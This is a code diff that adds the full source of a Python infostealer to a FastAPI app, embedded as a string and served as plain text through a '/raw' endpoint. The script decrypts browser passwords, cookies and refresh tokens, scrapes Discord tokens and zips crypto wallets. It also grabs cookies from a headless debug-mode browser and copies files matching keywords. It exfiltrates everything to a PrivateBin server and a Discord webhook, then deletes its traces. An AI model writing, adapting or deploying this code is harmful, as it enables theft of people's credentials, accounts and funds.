+    num = 0
+    for i, char_val in enumerate(v_bytes[::-1]):
+        num += char_val << (8 * i)
+    encoded_str = b''
+    while num:
+        num, idx = divmod(num, alphabet_len)
+        encoded_str = alphabet[idx:idx+1] + encoded_str
+    return (alphabet[0:1] * n_pad + encoded_str)
+
+def privatebin_encrypt(paste_passphrase_bytes: bytes, fixed_password_str: str, plaintext_content: str, 
+                       formatter_str: str, attachment_name_str: str, attachment_data_uri: str,
+                       compress_bool: bool, burn_bool: bool, opendiscussion_bool: bool):
+    combined_passphrase = paste_passphrase_bytes
+    if fixed_password_str: combined_passphrase += bytes(fixed_password_str, 'utf-8')
+
+    kdf_salt_bytes = os.urandom(8)
+    kdf_iterations_int, kdf_keysize_bits = 100000, 256
+    
+    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=int(kdf_keysize_bits / 8),
+                     salt=kdf_salt_bytes, iterations=kdf_iterations_int, backend=default_backend())
+    kdf_derived_key = kdf.derive(combined_passphrase)
+
+    adata_size_bits = 128 # AESGCM IV size, not AData size. AData size is implicit.
+    cipher_iv_bytes = os.urandom(int(adata_size_bits / 8)) # IV for AES-GCM needs to be 12 bytes usually
+    cipher_algo_str, cipher_mode_str = "aes", "gcm"
+    compression_type_str = "zlib" if compress_bool else "none"
+
+    data_to_encrypt_dict = {'paste': plaintext_content}
+    if attachment_name_str and attachment_data_uri:
+        data_to_encrypt_dict.update({'attachment': attachment_data_uri, 'attachment_name': attachment_name_str})
+
+    data_json_bytes = json_encode(data_to_encrypt_dict)
+    blob_to_encrypt = data_json_bytes
+    if compress_bool:
+        compressor = zlib.compressobj(wbits=-zlib.MAX_WBITS) 
+        blob_to_encrypt = compressor.compress(data_json_bytes) + compressor.flush()
+    
+    adata_part1_list = [
+        base64.b64encode(cipher_iv_bytes).decode("utf-8"), 
+        base64.b64encode(kdf_salt_bytes).decode("utf-8"),
+        kdf_iterations_int, kdf_keysize_bits, adata_size_bits, 
+        cipher_algo_str, cipher_mode_str, compression_type_str,
+    ]
+    full_adata_list = [adata_part1_list, formatter_str, int(opendiscussion_bool), int(burn_bool)]
+    adata_json_bytes = json_encode(full_adata_list)
+
+    aesgcm_cipher = AESGCM(kdf_derived_key)
+    ciphertext_with_tag_bytes = aesgcm_cipher.encrypt(cipher_iv_bytes, blob_to_encrypt, adata_json_bytes)
+    return full_adata_list, base64.b64encode(ciphertext_with_tag_bytes).decode("utf-8")
+
+def privatebin_send(api_url: str, fixed_password: str, plaintext: str, formatter: str,
+                    attach_name: str, attach_data: str, compress: bool, burn: bool,
+                    opendiscussion: bool, expiration: str):
+    passphrase_bytes = os.urandom(32)
+    passphrase_b58_url = base58_encode(passphrase_bytes).decode('utf-8')
+
+    try:
+        adata, ciphertext_b64 = privatebin_encrypt(
+            passphrase_bytes, fixed_password, plaintext, formatter, attach_name,
+            attach_data, compress, burn, opendiscussion
+        )
+    except Exception:
+        return (f"{api_url}?err_enc", "enc_id_err", "enc_del_err")
+
+    payload_dict = {"v": 2, "adata": adata, "ct": ciphertext_b64, "meta": {"expire": expiration}}
+    headers = {'X-Requested-With': 'JSONHttpRequest', 'Content-Type': 'application/json'}
+
+    try:
+        resp = requests.post(api_url, data=json_encode(payload_dict), headers=headers, timeout=60)
+        resp.raise_for_status()
+        resp_json = resp.json()
+    except requests.exceptions.HTTPError as e:
+        return (f"{api_url}?err_http_{e.response.status_code if e.response else 0}", "id_http_err", "del_http_err")
+    except requests.exceptions.RequestException:
+        return (f"{api_url}?err_req", "id_req_err", "del_req_err")
+    except json.JSONDecodeError:
+        return (f"{api_url}?err_json", "id_json_err", "del_json_err")
+
+    if resp_json.get('status') != 0:
+        return (f"{api_url}?err_api_{resp_json.get('status',0)}", resp_json.get('id',"id_api_err"), "del_api_err")
+
+    paste_id, rel_url, del_token = resp_json['id'], resp_json['url'], resp_json['deletetoken']
+    final_url = f"{api_url.rstrip('/')}{rel_url}#{passphrase_b58_url}"
+    delete_url = f"{api_url.rstrip('/')}/?pasteid={paste_id}&deletetoken={del_token}"
+    return (final_url, paste_id, delete_url)
+
+# --- FUNÇÕES DE PREPARAÇÃO DE DADOS PARA WEBHOOK ---
+def create_log_summary():
+    global PASSWORDS, COOKIECOUNT, DISCORD_TOKENS, FILES
+    return [len(PASSWORDS), COOKIECOUNT, len(DISCORD_TOKENS), len(FILES)]
+
+def prepare_upload_data_dict():
+    global PASSWORDS, COOKIES, DISCORD_TOKENS, WEB_DATA
+    cookie_sources = []
+    for c_entry in COOKIES:
+        cookie_sources.append(f"{c_entry.get('browser', 'N/A')} ({c_entry.get('profile', 'N/A')})")
+    
+    return {"passwords": PASSWORDS, 
+            "cookie_sources_found": list(set(cookie_sources)), 
+            "discord_tokens_info": DISCORD_TOKENS, 
+            "web_data_refresh_tokens": WEB_DATA}
+
+
+# --- FUNÇÃO MAIN ---
+def main():
+    global USER_PROFILE, APPDATA, LOCALAPPDATA, STORAGE_PATH, PROGRAMFILESX86
+    global COOKIECOUNT, TOKENCOUNT, FILES, DISCORD_TOKENS, PASSWORDS, COOKIES, WEB_DATA, DISCORD_IDS
+    global YOUR_RENDER_API_URL, PRIVATEBIN_FIXED_PASSWORD, DISCORD_WEBHOOK_URL
+
+    print("Executando main...")
+
+    # 1. Coleta de Senhas e Cookies de Browsers Chromium
+    print("Iniciando coleta de dados de browsers Chromium...")
+    for browser_info in CHROMIUM_BROWSERS:
+        if not browser_info.get("path") or not os.path.exists(browser_info["path"]):
+            continue
+        
+        local_state_file = os.path.join(browser_info["path"], "Local State")
+        if not os.path.exists(local_state_file):
+            continue
+
+        current_decryption_key_bytes = None
+        try:
+            with open(local_state_file, "r", encoding="utf-8", errors="ignore") as f_ls:
+                ls_json = json.load(f_ls)
+            enc_key_b64 = ls_json.get("os_crypt", {}).get("encrypted_key")
+            if not enc_key_b64: continue
+            
+            enc_key_bytes_dpapi = base64.b64decode(enc_key_b64)[5:] # Skip "DPAPI" prefix
+            current_decryption_key_bytes = win32crypt.CryptUnprotectData(enc_key_bytes_dpapi, None, None, None, 0)[1]
+        except Exception:
+            continue
+
+        for subpath_item in CHROMIUM_SUBPATHS:
+            profile_path_actual = os.path.join(browser_info["path"], subpath_item["path"])
+            if not os.path.exists(profile_path_actual): continue
+
+            login_db_path = os.path.join(profile_path_actual, "Login Data")
+            if os.path.exists(login_db_path):
+                temp_login_db_main_base = f"TEMP_Login_{browser_info['name'].replace(' ','_')}_{subpath_item['path'].replace(' ','_').replace('/','_').replace('\\','_')}.db"
+                temp_login_db_main = os.path.join(STORAGE_PATH, temp_login_db_main_base)
+                try:
+                    shutil.copy2(login_db_path, temp_login_db_main)
+                    conn_pw = sqlite3.connect(temp_login_db_main)
+                    cursor_pw = conn_pw.cursor()
+                    cursor_pw.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    for orig_url, uname, enc_pw_bytes in cursor_pw.fetchall():
+                        if enc_pw_bytes:
+                            pw = decrypt_data(enc_pw_bytes, current_decryption_key_bytes)
+                            if pw and pw != "Failed to decrypt":
+                                PASSWORDS.append({"browser": browser_info["name"], "profile": subpath_item["path"], 
+                                                  "url": orig_url, "username": uname, "password": pw})
+                    conn_pw.close()
+                except Exception:
+                    pass
+                finally:
+                    if os.path.exists(temp_login_db_main): os.remove(temp_login_db_main)
+            
+            chromiumcookies(profile_path_actual, browser_info["name"], subpath_item["path"], current_decryption_key_bytes)
+
+            webdata_db_path = os.path.join(profile_path_actual, "Web Data")
+            if os.path.exists(webdata_db_path):
+                temp_webdata_db_main_base = f"TEMP_WebData_{browser_info['name'].replace(' ','_')}_{subpath_item['path'].replace(' ','_').replace('/','_').replace('\\','_')}.db"
+                temp_webdata_db_main = os.path.join(STORAGE_PATH, temp_webdata_db_main_base)
+                try:
+                    shutil.copy2(webdata_db_path, temp_webdata_db_main)
+                    conn_wd = sqlite3.connect(temp_webdata_db_main)
+                    cursor_wd = conn_wd.cursor()
+                    # A tabela token_service pode não existir em todas as versões/browsers
+                    try:
+                        cursor_wd.execute("SELECT service, encrypted_token FROM token_service")
+                        for svc, enc_token_bytes in cursor_wd.fetchall():
+                            if enc_token_bytes:
+                                token_wd = decrypt_data(enc_token_bytes, current_decryption_key_bytes)
+                                if token_wd and token_wd != "Failed to decrypt":
+                                    WEB_DATA.append({"browser": browser_info["name"], "profile": subpath_item["path"], 
+                                                    "account_id": svc, "refresh_token": token_wd})
+                    except sqlite3.OperationalError: # Tabela não existe
+                        pass
+                    conn_wd.close()
+                except Exception:
+                    pass
+                finally:
+                    if os.path.exists(temp_webdata_db_main): os.remove(temp_webdata_db_main)
+            
+            for ext_info in BROWSER_EXTENSIONS:
+                ext_full_path = os.path.join(profile_path_actual, ext_info["path"].lstrip("\\/"))
+                if os.path.isdir(ext_full_path):
+                    zip_name_ext = f"Ext_{browser_info['name']}_{subpath_item['path']}_{ext_info['name']}"
+                    zip_to_storage(zip_name_ext, ext_full_path, STORAGE_PATH)
+    print("Coleta de browsers Chromium finalizada.")
+
+    # 2. Firefox
+    print("Iniciando coleta de dados do Firefox...")
+    if APPDATA:
+        ff_profiles_root = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')
+        if os.path.exists(ff_profiles_root):
+            for ff_profile_name in os.listdir(ff_profiles_root):
+                ff_profile_path = os.path.join(ff_profiles_root, ff_profile_name)
+                if os.path.isdir(ff_profile_path):
+                    ff_cookies_db = os.path.join(ff_profile_path, "cookies.sqlite")
+                    if os.path.exists(ff_cookies_db):
+                        temp_ff_db_base = f"TEMP_Firefox_{ff_profile_name}_cookies.sqlite"
+                        temp_ff_db = os.path.join(STORAGE_PATH, temp_ff_db_base)
+                        try:
+                            shutil.copy2(ff_cookies_db, temp_ff_db)
+                            conn_ff = sqlite3.connect(temp_ff_db)
+                            cursor_ff = conn_ff.cursor()
+                            cursor_ff.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
+                            ff_netscape_str = ""
+                            for host, name, val, path, exp, is_sec, is_http in cursor_ff.fetchall():
+                                sec_flg = "TRUE" if is_sec == 1 else "FALSE"
+                                inc_sub = "TRUE" if host.startswith('.') else "FALSE"
+                                ff_netscape_str += f"{host}\t{inc_sub}\t{path}\t{sec_flg}\t{exp}\t{name}\t{val}\n"
+                                COOKIECOUNT += 1
+                            conn_ff.close()
+                            if ff_netscape_str:
+                                COOKIES.append({"browser": "Firefox", "profile": ff_profile_name,
+                                                "cookies_netscape_b64": base64.b64encode(ff_netscape_str.encode('utf-8','ignore')).decode('utf-8')})
+                        except Exception:
+                            pass
+                        finally:
+                           if os.path.exists(temp_ff_db): os.remove(temp_ff_db)
+    print("Coleta do Firefox finalizada.")
+
+    # 3. Carteiras Desktop
+    print("Iniciando coleta de carteiras desktop...")
+    for wallet_info_item in WALLET_PATHS:
+        # Path já foi verificado na definição da lista, mas checar de novo por segurança
+        if wallet_info_item.get("path") and os.path.exists(wallet_info_item["path"]):
+            zip_name_wallet = f"Wallet_{wallet_info_item['name']}"
+            zip_to_storage(zip_name_wallet, wallet_info_item["path"], STORAGE_PATH)
+    print("Coleta de carteiras finalizada.")
+
+    # 4. Tokens do Discord
+    print("Iniciando coleta de tokens do Discord...")
+    global TOKENCOUNT # Usar a global
+    for d_path_info in DISCORD_PATHS:
+        if not d_path_info.get("path") or not os.path.exists(d_path_info["path"]): continue
+
+        d_app_name = d_path_info["name"]
+        key_for_discord_tokens = None
+        # A chave de descriptografia de tokens do Discord (para 'dQw4w...') é obtida do 'Local State' do próprio Discord,
+        # não de browsers, a menos que seja uma PWA do Discord ou algo assim.
+        # Para clientes Discord desktop:
+        if APPDATA and "discord" in d_app_name.lower(): # Checa se é um cliente Discord e se APPDATA existe
+            discord_app_data_name = d_app_name.lower().replace(" ", "") # Ex: "discord", "discordcanary"
+            # O path Local State para Discord é APPDATA\<discord_app_data_name>\Local State
+            actual_discord_local_state_path = os.path.join(APPDATA, discord_app_data_name, "Local State")
+
+            if os.path.exists(actual_discord_local_state_path):
+                try:
+                    with open(actual_discord_local_state_path, "r", encoding="utf-8", errors="ignore") as f_dls:
+                        dls_json = json.load(f_dls)
+                    enc_key_d_b64 = dls_json.get("os_crypt",{}).get("encrypted_key")
+                    if enc_key_d_b64:
+                        enc_key_d = base64.b64decode(enc_key_d_b64)[5:] # Skip "DPAPI"
+                        key_for_discord_tokens = win32crypt.CryptUnprotectData(enc_key_d, None, None, None, 0)[1]
+                except Exception:
+                    pass # Falha em obter a chave para este cliente Discord
+        
+        for item_name in os.listdir(d_path_info["path"]):
+            if item_name.endswith((".log", ".ldb")):
+                f_path = os.path.join(d_path_info["path"], item_name)
+                try:
+                    with open(f_path, "r", encoding="utf-8", errors="ignore") as f_content:
+                        content_str = f_content.read()
+                    
+                    for match_std_token in re.finditer(r"[\w-]{24,27}\.[\w-]{6}\.[\w-]{27,38}", content_str): # Ajustado para cobrir mais variações
+                        token_std = match_std_token.group(0)
+                        # Remover prefixo 'mfa.' se presente, pois não faz parte do token real para validação
+                        if token_std.startswith("mfa."): token_std = token_std[4:]
+
+                        user_data = validate_discord_token(token_std)
+                        if user_data and user_data.get("id") and user_data.get("id") not in DISCORD_IDS:
+                            DISCORD_IDS.append(user_data["id"])
+                            uname_std = f"{user_data['username']}#{user_data['discriminator']}" if user_data.get('discriminator',"0")!="0" else user_data['username']
+                            DISCORD_TOKENS.append({
+                                "token": token_std, "user_id": user_data["id"], "username": uname_std,
+                                "displayname": user_data.get("global_name"), "email": user_data.get("email"),
+                                "phone": user_data.get("phone"), "source": f"{d_app_name}/Regex"
+                            })
+                            TOKENCOUNT += 1 # Incrementar aqui, pois TOKENCOUNT é usado no resumo.
+                    
+                    if key_for_discord_tokens: # Só tentar descriptografar se tivermos uma chave
+                        for match_enc_token in re.finditer(r"dQw4w9WgXcQ:([a-zA-Z0-9+/=]+)", content_str):
+                            try:
+                                enc_token_b64_part = match_enc_token.group(1)
+                                # A parte criptografada precisa ser pré-processada como os browsers fazem (V10 ou V11 prefix)
+                                # No entanto, os tokens de Discord geralmente são armazenados de forma diferente.
+                                # A descriptografia aqui assume que 'enc_value_bytes' é o payload correto pós-base64
+                                # Se o decrypt_data espera um formato específico (como o prefixo 'v10'), isso falhará.
+                                # Para simplificar, vamos assumir que o valor após 'dQw4w9WgXcQ:' e base64.decode é o 'encrypted_value_bytes'
+                                # que o decrypt_data pode usar (provavelmente via DPAPI se AES GCM falhar).
+                                # O decrypt_data já tenta AES GCM (que precisa de IV e tag) e depois DPAPI.
+                                # Os tokens dQw4... do Discord geralmente são apenas o payload criptografado com DPAPI, sem o cabeçalho 'v10' ou 'v11'.
+                                # Vamos tentar passar os bytes decodificados diretamente para win32crypt, forçando o fallback no decrypt_data
+                                # ou ajustando o decrypt_data para lidar com isso melhor.
+
+                                # Para tokens dQw4, a descriptografia geralmente é apenas DPAPI sobre os bytes decodificados do base64.
+                                # A função decrypt_data tenta AES GCM primeiro, o que pode não ser o caso aqui.
+                                # Vamos decodificar e tentar com CryptUnprotectData diretamente para esses tokens.
+                                dec_token_mfa_payload = base64.b64decode(enc_token_b64_part)
+                                dec_token_mfa = win32crypt.CryptUnprotectData(dec_token_mfa_payload, None, None, None, 0)[1].decode('utf-8', 'ignore')
+
+                                if dec_token_mfa and dec_token_mfa != "Failed to decrypt": # Checagem redundante se o decode acima já deu certo.
+                                    user_data_mfa = validate_discord_token(dec_token_mfa)
+                                    if user_data_mfa and user_data_mfa.get("id") and user_data_mfa.get("id") not in DISCORD_IDS:
+                                        DISCORD_IDS.append(user_data_mfa["id"])
+                                        uname_mfa = f"{user_data_mfa['username']}#{user_data_mfa['discriminator']}" if user_data_mfa.get('discriminator',"0")!="0" else user_data_mfa['username']
+                                        DISCORD_TOKENS.append({
+                                            "token": dec_token_mfa, "user_id": user_data_mfa["id"], "username": uname_mfa,
+                                            "displayname": user_data_mfa.get("global_name"), "email": user_data_mfa.get("email"),
+                                            "phone": user_data_mfa.get("phone"), "source": f"{d_app_name}/Decrypted_dQw4"
+                                        })
+                                        TOKENCOUNT +=1
+                            except Exception:
+                                pass
+                except Exception:
+                    pass
+    print(f"Coleta de tokens do Discord finalizada. Tokens encontrados: {len(DISCORD_TOKENS)}")
+
+    # 5. Cookies via WebSocket (para browsers abertos)
+    print("Iniciando coleta de cookies via WebSocket (para browsers abertos)...")
+    for browser_ws_info in CHROME_PATHS: 
+        if not all(k in browser_ws_info for k in ["path", "exepath", "taskname"]) or \
+           not browser_ws_info.get("path") or not os.path.exists(browser_ws_info["path"]) or \
+           not browser_ws_info.get("exepath") or not os.path.exists(browser_ws_info["exepath"]):
+            continue
+
+        proc_ws_browser = None
+        try:
+            ws_cmd = [browser_ws_info["exepath"], 
+                      "--headless=new", 
+                      "--remote-debugging-port=9222", 
+                      "--remote-allow-origins=*",
+                      f"--user-data-dir={browser_ws_info['path']}"]
+            
+            proc_ws_browser = subprocess.Popen(ws_cmd, creationflags=subprocess.CREATE_NO_WINDOW, 
+                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(3)
+
+            # Tentar obter a lista de alvos algumas vezes
+            targets_json = None
+            for _ in range(3): # Tentar 3 vezes
+                try:
+                    targets_resp = requests.get("http://127.0.0.1:9222/json/list", timeout=5)
+                    targets_resp.raise_for_status()
+                    targets_json = targets_resp.json()
+                    if targets_json and targets_json[0].get("webSocketDebuggerUrl"):
+                        break # Sucesso
+                except requests.exceptions.RequestException:
+                    time.sleep(1) # Esperar e tentar novamente
+            
+            if not targets_json or not targets_json[0].get("webSocketDebuggerUrl"):
+                if proc_ws_browser: proc_ws_browser.terminate()
+                continue
+
+            ws_debugger_url = targets_json[0]["webSocketDebuggerUrl"]
+            ws_conn = websocket.create_connection(ws_debugger_url, timeout=10)
+            
+            ws_conn.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
+            ws_recv_data = ws_conn.recv()
+            ws_conn.close()
+            
+            if proc_ws_browser:
+                proc_ws_browser.terminate()
+                try: proc_ws_browser.wait(timeout=5)
+                except subprocess.TimeoutExpired: proc_ws_browser.kill()
+
+
+            cookies_json_ws = json.loads(ws_recv_data)
+            if "result" in cookies_json_ws and "cookies" in cookies_json_ws["result"]:
+                netscape_str_ws = ""
+                for c_item in cookies_json_ws["result"]["cookies"]:
+                    dom = c_item.get('domain', '')
+                    inc_sub_ws = "TRUE" if dom.startswith('.') else "FALSE"
+                    pth_ws = c_item.get('path', '/')
+                    sec_ws_flg = "TRUE" if c_item.get('secure', False) else "FALSE"
+                    exp_ws_ts = int(c_item.get('expires', 0)) if not c_item.get('session', True) else 0
+                    nm_ws = c_item.get('name', '')
+                    val_ws = c_item.get('value', '')
+                    netscape_str_ws += f"{dom}\t{inc_sub_ws}\t{pth_ws}\t{sec_ws_flg}\t{exp_ws_ts}\t{nm_ws}\t{val_ws}\n"
+                    COOKIECOUNT += 1
+                
+                if netscape_str_ws:
+                    COOKIES.append({
+                        "browser": f"{browser_ws_info['name']} (WS)", "profile": "N/A (WS)",
+                        "cookies_netscape_b64": base64.b64encode(netscape_str_ws.encode('utf-8','ignore')).decode('utf-8')
+                    })
+        except Exception:
+            pass
+        finally:
+            if proc_ws_browser and proc_ws_browser.poll() is None:
+                try:
+                    proc_ws_browser.terminate()
+                    proc_ws_browser.wait(timeout=3)
+                except subprocess.TimeoutExpired:
+                    proc_ws_browser.kill()
+                except Exception: pass
+    print("Coleta de cookies via WebSocket finalizada.")
+
+    # 6. Busca de Arquivos por Palavras-chave
+    print("Iniciando busca de arquivos por palavras-chave...")
+    for search_root_path in PATHS_TO_SEARCH:
+        if not search_root_path or not os.path.isdir(search_root_path): continue
+        for dir_root, _, files_in_curr_dir in os.walk(search_root_path):
+            for fname_key_search in files_in_curr_dir:
+                fname_lower_key = fname_key_search.lower()
+                f_ext_key = os.path.splitext(fname_lower_key)[1]
+                if f_ext_key in ALLOWED_EXTENSIONS:
+                    if any(keyword in fname_lower_key for keyword in FILE_KEYWORDS):
+                        src_fpath_key = os.path.join(dir_root, fname_key_search)
+                        try:
+                            if os.path.getsize(src_fpath_key) < 5 * 1024 * 1024: # Max 5MB
+                                dst_fname_key = f"KeywordFile_{os.path.basename(dir_root)}_{fname_key_search}"
+                                # Sanitizar nome do arquivo para destino
+                                dst_fname_key_sanitized = "".join(c if c.isalnum() or c in (' ', '_', '-', '.') else '_' for c in dst_fname_key).rstrip()
+                                dst_fpath_key = os.path.join(STORAGE_PATH, dst_fname_key_sanitized)
+                                shutil.copy2(src_fpath_key, dst_fpath_key)
+                                # FILES.append(dst_fname_key_sanitized) # Adicionar à lista FILES para o ZIP final
+                        except Exception:
+                            pass
+                        break 
+    print("Busca de arquivos por palavras-chave finalizada.")
+
+    # 7. Coleta do Telegram
+    telegram()
+
+    # --- PREPARAÇÃO PARA ENVIO E WEBHOOK ---
+    FILES.clear() 
+    if os.path.exists(STORAGE_PATH):
+        for item_name_storage in os.listdir(STORAGE_PATH):
+            if os.path.isfile(os.path.join(STORAGE_PATH, item_name_storage)):
+                 FILES.append(item_name_storage) 
+    
+    final_zip_archive_path = os.path.join(STORAGE_PATH, 'CollectedData_Archive_From_Victim.zip')
+    items_in_zip_count = 0
+    try:
+        with zipfile.ZipFile(final_zip_archive_path, 'w', compression=zipfile.ZIP_DEFLATED, allowZip64=True) as zf_final:
+            for fname_to_zip_final in FILES: 
+                if fname_to_zip_final.lower() == os.path.basename(final_zip_archive_path).lower():
+                    continue 
+                
+                full_src_path_for_zip = os.path.join(STORAGE_PATH, fname_to_zip_final)
+                if os.path.isfile(full_src_path_for_zip): # Checar se o arquivo realmente existe antes de tentar adicionar
+                    zf_final.write(full_src_path_for_zip, arcname=fname_to_zip_final)
+                    items_in_zip_count +=1
+    except Exception as e_finalzip:
+        print(f"ERRO ao criar ZIP final '{final_zip_archive_path}': {e_finalzip}")
+        final_zip_archive_path = None
+
+    zip_attachment_name_pb = os.path.basename(final_zip_archive_path) if final_zip_archive_path and os.path.exists(final_zip_archive_path) else "CollectedData_Archive.zip"
+    zip_attachment_data_uri_pb = ""
+    if final_zip_archive_path and os.path.exists(final_zip_archive_path):
+        mime_type_final_zip, _ = guess_type(final_zip_archive_path, strict=False)
+        mime_type_final_zip = mime_type_final_zip if mime_type_final_zip else 'application/zip'
+        try:
+            with open(final_zip_archive_path, mode='rb') as f_zip_content:
+                zip_bin_data = f_zip_content.read()
+            zip_attachment_data_uri_pb = f'data:{mime_type_final_zip};base64,{base64.b64encode(zip_bin_data).decode("utf-8")}'
+        except Exception as e_prep_zip_pb:
+            print(f"ERRO ao preparar anexo ZIP para PrivateBin: {e_prep_zip_pb}")
+            zip_attachment_data_uri_pb = "" 
+
+    pb_url_zip, pb_id_zip, pb_del_url_zip = "N/A", "N/A", "N/A"
+    if zip_attachment_data_uri_pb:
+        pb_url_zip, pb_id_zip, pb_del_url_zip = privatebin_send(
+            api_url=YOUR_RENDER_API_URL, fixed_password=PRIVATEBIN_FIXED_PASSWORD,
+            plaintext="", formatter="plaintext", attach_name=zip_attachment_name_pb,
+            attach_data=zip_attachment_data_uri_pb, compress=True, burn=False,
+            opendiscussion=False, expiration="1week"
+        )
+
+    creds_data_dict = prepare_upload_data_dict()
+    creds_data_str_json = json.dumps(creds_data_dict, indent=2, ensure_ascii=False)
+    
+    pb_url_creds, pb_id_creds, pb_del_url_creds = privatebin_send(
+        api_url=YOUR_RENDER_API_URL, fixed_password=PRIVATEBIN_FIXED_PASSWORD,
+        plaintext=creds_data_str_json, formatter="json", 
+        attach_name="", attach_data="", compress=True, burn=False, 
+        opendiscussion=False, expiration="1week"
+    )
+    
+    log_values = create_log_summary() 
+    webhook_payload = {"username": "Captain Hook Reporting", "avatar_url": "https://i.imgur.com/rKHcWbZ.jpeg"}
+
+    discord_tokens_str_embed = "\n\n👾 **Discord Tokens Encontrados (ALERTA: Tokens Abaixo!):**\n"
+    if DISCORD_TOKENS:
+        for idx, dt_info in enumerate(DISCORD_TOKENS):
+            udisp = dt_info.get('username', 'N/I')
+            if dt_info.get('displayname') and dt_info.get('displayname') != udisp:
+                udisp += f" ({dt_info.get('displayname')})"
+            tok_val = dt_info.get('token', 'AUSENTE') # O token real está aqui
+            src_val = dt_info.get('source', 'N/A')
+            discord_tokens_str_embed += f"`{idx+1}. {udisp}:` `{tok_val}` (Fonte: {src_val})\n" # E é adicionado aqui
+            if len(discord_tokens_str_embed) > 1800: # Aumentado um pouco o limite, mas cuidado
+                discord_tokens_str_embed += "*(...mais tokens omitidos devido ao tamanho)*\n"
+                break 
+    else:
+        discord_tokens_str_embed = "\n👾 **Discord Tokens:** Nenhum encontrado.\n"
+
+    embed_desc = (
+        f"🔑 **Passwords:** {log_values[0]}\n"
+        f"🍪 **Cookies (Total):** {log_values[1]}\n"
+        f"📄 **Arquivos no ZIP:** {items_in_zip_count} (de {log_values[3]} arquivos candidates no storage)\n" 
+        f"{discord_tokens_str_embed}\n" # <-- AQUI OS TOKENS DO DISCORD SÃO INCLUÍDOS DIRETAMENTE NA DESCRIÇÃO DO EMBED
+        f"🔗 **Paste de Credenciais:** [Ver Credenciais]({pb_url_creds})\n"
+        f"🗑️ *Deletar Credenciais:* {pb_del_url_creds}\n\n" # Removido o formato de link para URL de deleção para economizar espaço se necessário
+        f"📦 **Paste do Arquivo ZIP:** {'[Ver Arquivo ZIP](' + pb_url_zip + ')' if pb_url_zip != 'N/A' else 'ZIP não enviado ou falhou.'}\n"
+        f"🗑️ *Deletar ZIP:* {pb_del_url_zip if pb_del_url_zip != 'N/A' else 'N/A'}" # Idem para URLde deleção do ZIP
+    )
+    
+    if len(embed_desc) > 4000: 
+        embed_desc = embed_desc[:3970] + "\n*(...descrição truncada)*"
+
+    webhook_payload["embeds"] = [{
+        "title": f"🏴‍☠️ Novo Tesouro! | IDs: `{pb_id_creds or 'N/A'}` (Creds) / `{pb_id_zip or 'N/A'}` (ZIP)",
+        "description": embed_desc, "color": 0x1E1E1E, 
+        "footer": {"text": f"Relatório de: {os.getenv('COMPUTERNAME', 'PC N/A')} @ {os.getenv('USERNAME', 'Usuário N/A')}"},
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()) 
+    }]
+
+    try:
+        wh_resp = requests.post(DISCORD_WEBHOOK_URL, json=webhook_payload, timeout=20)
+        wh_resp.raise_for_status()
+    except requests.exceptions.HTTPError as e:
+        if e.response is not None:
+            try: print(f"Erro Discord (JSON): {e.response.json()}")
+            except json.JSONDecodeError:  print(f"Erro Discord (Texto): {e.response.text}")
+    except requests.exceptions.RequestException:
+        pass
+    except Exception:
+        pass
+
+    print("Iniciando limpeza final do diretório de armazenamento...")
+    time.sleep(2)
+    try:
+        if os.path.exists(STORAGE_PATH):
+            shutil.rmtree(STORAGE_PATH)
+            print(f"Diretório de armazenamento '{STORAGE_PATH}' removido.")
+    except Exception as e: 
+        print(f"ERRO durante a limpeza final de '{STORAGE_PATH}': {e}")
+    
+    print("-" * 30)
+    print("Script de coleta e envio finalizado.")
+
+
+if __name__ == '__main__':
+    # Para executar o script principal:
+    main()
+"""
+
+app.get("/raw", response_class=PlainTextResponse)
+async def get_raw_code():
+    """
+    Serve um conteúdo de arquivo de código como texto plano.
+    """
+    return PlainTextResponse(content=RAW_FILE_CONTENT, media_type="text/plain; charset=utf-8")
+
 
 @app.get("/ping", response_model=Dict[str, str])
 async def ping():
